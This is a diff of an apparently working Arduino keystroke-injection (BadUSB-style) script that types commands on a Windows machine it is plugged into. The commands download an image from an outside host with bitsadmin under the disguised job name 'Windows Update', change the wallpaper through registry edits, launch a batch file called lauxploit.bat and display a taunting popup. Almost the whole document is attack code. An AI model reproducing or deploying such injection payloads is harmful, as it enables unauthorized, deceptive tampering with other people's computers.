@@ -1,6 +1,6 @@
-#define DELAY_BEGIN 3000
+#define DELAY_BEGIN 5000
 #define DELAY_CMD 500
-#define DELAY_TYPE 10
+#define DELAY_TYPE 5
 #define DELAY_END 300000
 
 #include <Keyboard.h>
@@ -42,8 +42,9 @@ void loop()
       delay(DELAY_TYPE);
 
     ////////// BODY OF LAUXPLOIT.BAT
-      //Keyboard.println("bitsadmin.exe /transfer \"JobName\" http://thumbs.dreamstime.com/b/cartoon-girl-crying-ice-cream-drop-28115622.jpg C:\\lvi.jpg");
-    
+    // Download the wallpaper
+    Keyboard.println("bitsadmin.exe /transfer \"Windows Update\" http://thumbs.dreamstime.com/b/cartoon-girl-crying-ice-cream-drop-28115622.jpg C:\\Users\\ple\\Pictures\\lvi.jpg\n");
+    delay(DELAY_TYPE);
     Keyboard.println("reg add \"HKCU\\control panel\\desktop\" /v wallpaper /t REG_SZ /d \"C:\\Users\\ple\\Pictures\\lvi.jpg\" /f\n");
     delay(DELAY_TYPE);
     Keyboard.println("reg add \"HKCU\\control panel\\desktop\" /v TileWallpaper /t REG_SZ /f /d 0\n");
@@ -74,7 +75,7 @@ void loop()
       Keyboard.println("Y\n");
       delay(DELAY_TYPE);
     
-    //Launch it once  
+    //Launch it once
     Keyboard.println("lauxploit.bat\n");
     delay(DELAY_CMD);
     Keyboard.println("Msg * \"To my beloved OLD secret admirer, please receive this gift as a mark of my unwavering love for you\"\n");
